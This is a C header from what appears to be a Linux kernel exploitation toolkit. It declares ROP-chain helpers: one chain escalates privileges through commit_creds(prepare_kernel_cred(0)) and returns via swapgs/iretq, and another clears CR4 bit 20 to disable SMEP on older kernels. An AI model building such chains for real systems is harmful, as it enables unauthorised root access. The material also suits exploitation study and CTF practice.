#ifndef ROP_H
#define ROP_H

#include <stdint.h>
#include <sys/types.h>
#include "privesc.h"
#include "ret2user.h"

/* ============= ROP Helpers ==============*/

/*
 * append_chain - Concatenate an ROP chain fragment into a larger chain.
 *
 * Copy |src_len| elements from the |src| array into the |dst| array starting at index |*off|.
 *      After copying, it advances the offset |*off| by |src_len| 
 *      and returns the updated offset.
 *
 * For ROP chains, each entry is a qword (8 bytes on 64-bit systems).
 *
 * Parameters:
 *   dst     - Pointer to the destination chain
 *   off     - Pointer to the current write offset in the destination chain.
 *   src     - Pointer to the source chain of uintptr_t values to copy.
 *   src_len - Number of uintptr_t elements to copy from src to dst (len for src chain).
 *
 * Returns:
 *   The new offset value after appending the elements.
 *
 * Example:
 *     uintptr_t chain[64];       // Final combined chain
 *     uintptr_t rop1[16];        // First subchain
 *     uintptr_t rop2[16];        // Second subchain
 *     size_t offset = 0;
 *
 *     size_t len1 = chain_rop1(rop1);  // fills rop1[], returns number of qwords
 *     offset = append_chain(chain, &offset, rop1, len1);
 *
 *     size_t len2 = chain_rop2(rop2);  // fills rop2[], returns number of qwords
 *     offset = append_chain(chain, &offset, rop2, len2);
 *
 *     // `chain` now contains: [rop1..., rop2...]
 */
size_t append_chain(uintptr_t *dst,
                    size_t *off,
                    const uintptr_t *src,
                    size_t src_len);


/* ============= Kcreds Commit =============
 * Privesc with commit_creds(prepare_kernel_cred(0));
 *      then call iretq (from kernel codes) to return to user space

 * prepare_kernel_cred -> commit_creds -> swapgs -> iretq
 * */
size_t chain_kcred_iretq(uintptr_t *rop,
                        uintptr_t pop_rdi_ret,
                        uintptr_t prepare_kernel_cred,
                        const uintptr_t *mov_rax_rdi_chain,
                        uintptr_t commit_creds,
                        uintptr_t swapgs_pop_rbp_ret,
                        uintptr_t iretq,
                        iretq_user_ctx_t ctx);


/* ============= CR4 Hijack =============
 * CR4 is a 64-bit control register, 
 *      whewre each bit enables or disables certain CPU features.
 *      
 * Bit 20 (1 << 20) controls SMEP - 1 for on, 0 for off.
 *
 * [!] But this is patched since Linux 5.1 in May 2019
 *      native_write_cr4() now ensures that once CR4 is set,
 *      those bits cannot be cleared via ROP or other direct writes
 *
 * This works only for Linux 4.* and older.
 * */ 

/* Chain up to zero out 20th bit of CR4 */
size_t chain_cr4_smep(uintptr_t *rop, 
                    uintptr_t pop_rdi_ret,
                    uintptr_t cr4_val,
                    uintptr_t mov_cr4_rdi_ret,
                    uintptr_t ret_addr);


#endif

